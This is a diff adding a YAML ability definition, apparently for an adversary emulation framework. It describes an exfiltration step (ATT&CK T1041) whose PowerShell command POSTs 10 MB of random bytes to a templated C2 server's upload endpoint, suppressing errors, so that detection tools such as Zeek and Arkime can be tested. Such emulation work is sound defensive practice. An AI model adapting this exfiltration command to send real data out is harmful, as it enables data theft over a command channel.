@@ -1,0 +1,19 @@
+---
+
+- id: 4a100006-cafe-4001-8001-c0ffee000006
+  name: Large outbound data transfer (L5 step 5)
+  description: POST a large synthetic payload to generate high byte-volume outbound traffic visible in Zeek conn.log and Arkime
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: |
+          $data = New-Object byte[] (10 * 1024 * 1024);
+          [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data);
+          try {
+            Invoke-WebRequest -Uri "http://#{server}/file/upload" -Method POST -Body $data -TimeoutSec 30 -ErrorAction SilentlyContinue | Out-Null
+          } catch {}
+          Write-Host "[L5-5] 10 MB transfer complete"
